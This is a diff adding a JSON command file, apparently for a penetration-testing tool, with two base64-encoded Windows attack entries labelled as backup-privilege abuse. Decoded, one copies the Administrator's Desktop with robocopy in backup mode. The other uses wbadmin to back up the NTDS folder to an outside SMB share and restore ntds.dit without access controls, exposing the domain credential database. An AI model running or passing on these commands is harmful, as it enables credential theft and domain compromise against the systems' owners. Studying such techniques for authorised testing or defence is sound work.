@@ -1,0 +1,18 @@
+{
+    "command": {
+        "robocopy_abuse": {
+            "description": "SeBackup Privilege Abuse to copy Admin files.",
+            "commands": [
+                "cm9ib2NvcHkgL2IgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXCBDOlw="
+            ]
+        },
+        "backup_abuse_to_share": {
+            "description": "Abusing backup permissions to make a backup and restore a backup of NTDS.dit without ACL permissions. Use in conjunction with Samba Share.",
+            "commands": [
+                "I0JhY2t1cCB0byBmaWxlIHNoYXJlCmVjaG8gIlkiIHwgd2JhZG1pbiBzdGFydCBiYWNrdXAgLWJhY2t1cHRhcmdldDpcXDEwLjEwLjE2LjZcc21iIC1pbmNsdWRlOmM6XHdpbmRvd3NcbnRkcwoKI0dldCBiYWNrdXAgdmVyc2lvbnMKd2JhZG1pbiBnZXQgdmVyc2lvbnMKCiNSZXN0b3JlIE5URFMuZGl0IGZyb20gZmlsZSBzaGFyZSB0byBsb2NhdGlvbiBXSVRIT1VUIEFDTAplY2hvICJZIiB8IHdiYWRtaW4gc3RhcnQgcmVjb3ZlcnkgLXZlcnNpb246MTAvMTUvMjAyNC0yMToyNyAtaXRlbXR5cGU6ZmlsZSAtaXRlbXM6Yzpcd2luZG93c1xudGRzXG50ZHMuZGl0IC1yZWNvdmVyeXRhcmdldDpDOlwgLW5vdHJlc3RvcmVhY2w="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
